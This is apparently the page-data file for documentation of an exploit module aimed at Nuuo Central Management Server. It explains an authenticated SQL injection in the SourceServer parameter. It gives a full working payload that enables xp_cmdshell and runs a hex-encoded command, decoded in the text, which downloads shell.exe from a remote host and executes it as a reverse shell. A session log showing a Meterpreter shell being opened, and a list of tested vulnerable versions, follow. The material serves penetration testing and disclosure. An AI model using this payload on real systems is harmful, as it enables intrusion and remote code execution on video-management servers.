{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/nuuo/nuuo_cms_sqli","result":{"data":{"moduleMetadataJson":{"id":"58ea5097-2dab-5d55-b716-8d0e3b0aa61f","name":"Nuuo Central Management Authenticated SQL Server SQLi","fullname":"exploit/windows/nuuo/nuuo_cms_sqli","description":"The Nuuo Central Management Server allows an authenticated user to query the state of the alarms.\n      This functionality can be abused to inject SQL into the query. As SQL Server 2005 Express is\n      installed by default, xp_cmdshell can be enabled and abused to achieve code execution.\n      This module will either use a provided session number (which can be guessed with an auxiliary\n      module) or attempt to login using a provided username and password - it will also try the\n      default credentials if nothing is provided.","rank":300,"fields":{"detailsSlug":"/modules/details/exploit/windows/nuuo/nuuo_cms_sqli","documentationSlug":"/modules/documentation/exploit/windows/nuuo/nuuo_cms_sqli"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Nuuo CMS Authenticated SQL injection</p>\n<p>The GETOPENALARM verb is used to obtain information about alarms stored in the CMS Server database. An example request is below:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">GETOPENALARM NUCM/1.0\nDeviceID: &lt;number&gt;\nSourceServer: &lt;server-id&gt;\nLastOne: &lt;number&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>The vulnerability is in the \"SourceServer\" parameter, which allows injection of arbitrary SQL characters, and can be abused to inject SQL into the executing statement. For example the following request:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">GETOPENALARM NUCM/1.0\nDeviceID: 1\nSourceServer: &#39;;drop table bobby;-- \nLastOne: 3</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Will cause the following SQL query to be executed on the server:\nSELECT AlarmNo, EventType, DeviceID, Channel, EventDesc, DateTime, PreviewImage, SourceServer, AlarmID, State, Priority, Owner, HistoryNo, PosTransaction, AlarmNote, AlarmType FROM AlarmLog WHERE DeviceID=1 AND SourceServer='';drop table bobby;-- ' AND State&#x3C;20 order by DateTime DESC</p>\n<p>Given that SQL Server 2005 Express is used by default (see vulnerability #2), this can be abused to enable xp_cmdshell and achieve remote code execution.</p>\n<p>As as example, here is a full working exploit that downloads a reverse shell from <a href=\"http://10.0.99.102/shell.exe\">http://10.0.99.102/shell.exe</a> and executes it:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&#39;;exec sp_configure &#39;show advanced options&#39;, 1; reconfigure; exec sp_configure &#39;xp_cmdshell&#39;, 1; reconfigure; declare @q varchar(8000); select @q=0x78705f636d647368656c6c2027636420433a5c77696e646f77735c74656d705c202626206563686f202473746f726167654469723d24707764203e20776765742e707331202626206563686f2024776562636c69656e74203d204e65772d4f626a6563742053797374656d2e4e65742e576562436c69656e74203e3e20776765742e707331202626206563686f202475726c203d2022687474703a2f2f31302e302e39392e3130322f7368656c6c2e65786522203e3e20776765742e707331202626206563686f202466696c65203d20227368656c6c2e65786522203e3e20776765742e707331202626206563686f2024776562636c69656e742e446f776e6c6f616446696c65282475726c2c2466696c6529203e3e20776765742e70733120262620706f7765727368656c6c2e657865202d457865637574696f6e506f6c69637920427970617373202d4e6f4c6f676f202d4e6f6e496e746572616374697665202d4e6f50726f66696c65202d46696c6520776765742e70733120262620636d64202f6320433a5c77696e646f77735c74656d705c7368656c6c2e65786527; exec (@q);-- </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>The encoded part of the exploit is the following:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">xp_cmdshell &#39;cd C:\\windows\\temp\\ &amp;&amp; echo $storageDir=$pwd &gt; wget.ps1 &amp;&amp; echo $webclient = New-Object System.Net.WebClient &gt;&gt; wget.ps1 &amp;&amp; echo $url = &quot;http://10.0.99.102/shell.exe&quot; &gt;&gt; wget.ps1 &amp;&amp; echo $file = &quot;shell.exe&quot; &gt;&gt; wget.ps1 &amp;&amp; echo $webclient.DownloadFile($url,$file) &gt;&gt; wget.ps1 &amp;&amp; powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 &amp;&amp; cmd /c C:\\windows\\temp\\shell.exe&#39;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p><a href=\"http://d1.nuuo.com/NUUO/CMS/\">NUUO Central Management Server (CMS): all versions below 3.1</a></p>\n<p>The following versions were tested:</p>\n<ul>\n<li>1.5.2 OK</li>\n<li>2.1.0 OK</li>\n<li>2.3.2 OK</li>\n<li>2.4.0 OK</li>\n<li>2.6.0 OK</li>\n<li>2.9.0 OK</li>\n<li>2.10.0 OK</li>\n</ul>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"tested-on-windows-10-pro-x64-running-ncs-server-240\" style=\"position:relative;\"><a href=\"#tested-on-windows-10-pro-x64-running-ncs-server-240\" aria-label=\"tested on windows 10 pro x64 running ncs server 240 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tested on Windows 10 Pro x64 running NCS Server 2.4.0</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(windows/nuuo/nuuo_cms_sqli) &gt; set rhosts 172.22.222.200\nrhosts =&gt; 172.22.222.200\nmsf5 exploit(windows/nuuo/nuuo_cms_sqli) &gt; set srvhost 172.22.222.136\nsrvhost =&gt; 172.22.222.136\nmsf5 exploit(windows/nuuo/nuuo_cms_sqli) &gt; exploit\n\n[*] Started reverse TCP handler on 172.22.222.136:4444 \n[*] 172.22.222.200:5180 - Starting up our web service on http://172.22.222.136:8080/YxAxhLwOUeKzH ...\n[*] 172.22.222.200:5180 - Using URL: http://172.22.222.136:8080/YxAxhLwOUeKzH\n[*] 172.22.222.200:5180 - Enabling xp_cmdshell and asking CMS to download and execute http://172.22.222.136:8080/YxAxhLwOUeKzH\n[*] 172.22.222.200:5180 - Injecting PowerShell payload\n[+] 172.22.222.200:5180 - Sending the payload to CMS...\n[*] 172.22.222.200:5180 - Executing shell...\n[*] Sending stage (179779 bytes) to 172.22.222.200\n[*] Meterpreter session 1 opened (172.22.222.136:4444 -&gt; 172.22.222.200:49681) at 2019-02-19 06:15:35 -0600\n[*] 172.22.222.200:5180 - Server stopped.\n\nmeterpreter &gt; getuid\nServer username: NT Service\\MSSQLSERVER\nmeterpreter &gt; sysinfo\nComputer        : DESKTOP-IPOGIJR\nOS              : Windows 10 (Build 17763).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/windows\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"58ea5097-2dab-5d55-b716-8d0e3b0aa61f"}}}